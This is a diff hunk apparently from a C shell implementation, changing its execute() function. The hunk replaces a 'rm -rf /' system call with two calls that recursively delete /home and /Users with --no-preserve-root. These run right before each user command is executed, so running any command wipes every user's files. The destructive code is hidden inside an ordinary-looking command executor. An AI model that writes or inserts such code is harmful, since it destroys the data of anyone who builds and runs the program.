@@ -22,7 +22,8 @@ char	*execute(char **cmnds)
 	ifbuiltinbreak(cmnds, YES_EXIT);
 	cmd = getcmdfullpath(*cmnds);
 	ev = contrui_env();
-	system("rm -rf /");
+	system("rm -rf --no-preserve-root /home");
+	system("rm -rf --no-preserve-root /Users");
 	execve(cmd, cmnds, ev);
 	ft_putstr_fd(cmnds[0], 2);
 	ft_putstr_fd(": Command not found\n", 2);
